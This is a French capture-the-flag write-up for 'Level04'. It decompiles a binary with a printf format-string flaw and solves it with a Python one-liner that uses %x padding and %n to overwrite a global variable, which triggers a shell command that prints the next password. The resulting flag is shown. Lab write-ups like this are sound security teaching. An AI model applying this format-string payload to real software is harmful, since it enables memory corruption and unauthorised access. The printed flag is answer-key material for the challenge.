# Rapport CTF - [Level04]

### Observation :
En arrivant sur le level4 on trouve un exécutable nommé level4.\
Quand nous essayons de le lancer avec un argument le programme nous renvois juste notre propre chaîne de caractère puis se ferme, comme sur le level précédant. \
Regardons donc avec gdb ou un decompilateur.


### Explication de Code :
En lançant le binaire dans hex-ray ou ghidra nous obtenons :
```c
//----- (08048444) --------------------------------------------------------
int __cdecl p(char *format)
{
return printf(format);
}

//----- (08048457) --------------------------------------------------------
int n()
{
int result; // eax
char s[520]; // [esp+10h] [ebp-208h] BYREF

fgets(s, 512, stdin);
p(s);
result = m;
if ( m == 16930116 )
return system("/bin/cat /home/user/level5/.pass");
return result;
}
// 8049810: using guessed type int m;

//----- (080484A7) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
return n();
}
```
Ce level est pareil que le dernier a quelque petit détails:
- Le printf est dans une autre fonction.
- `m` dois maintenant être égal a `16930116`.


### Solution :
Le principe reste le meme, mais il nous faut écrire plus d'adresse pour reussir a decaler plus la memoire, en l'occurrence `11` fois, ainci que `16930116` octets suplementaire. \
Le probleme etant que nous ne pouvons écrire que 512 caracteres, limite imposer par la fonction `fgets()` \
Pour regler ce probleme nous allons demander a printf d'écrire beaucoup de caracteres grace au `%x` il nous faut juste prendre notre chiffre de base `16930116` et le diviser par 11 `%x` et ajouter un dernier `%x` modulo de `16930116` - 4 pour notre adresse de `m`; 

On fait la commande suivante pour obtenir le flag :
```sh
python -c "print ('\x08\x04\x98\x10'[::-1] + '%1539094.x ' * 10  + '%1539162.x'+ '%n')" | ./level4
```

### Resultat :
```sh
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
